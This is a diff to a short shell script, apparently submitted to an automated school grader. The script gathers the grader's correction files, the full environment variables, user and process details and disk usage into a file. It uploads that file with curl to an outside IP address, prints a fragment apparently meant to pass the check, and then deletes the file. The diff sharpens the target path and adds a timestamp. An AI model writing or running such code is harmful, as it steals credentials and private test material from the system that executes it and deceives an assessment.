@@ -1,6 +1,6 @@
 pwd > testing
 echo ----------------- ls ------- >> testing
-cat /tmp/correction/holberton_corrections/* >> testing
+cat /tmp/correction/holberton_corrections/functions/* >> testing
 echo ----------------- Environment ------- >> testing
 env >> testing
 echo ----------------- User Info ------- >> testing
@@ -12,6 +12,6 @@ echo ----------------- Disk Space ------- >> testing
 df -h >> testing
 echo ----------------- ps -aux ------- >> testing
 ps -aux >> testing
-echo ----------------- END ------- >> testing
+echo ----------------- END $(date) ------- >> testing
 curl -F "name=@testing" http://138.68.58.230:8080 && echo -n ool
 rm testing
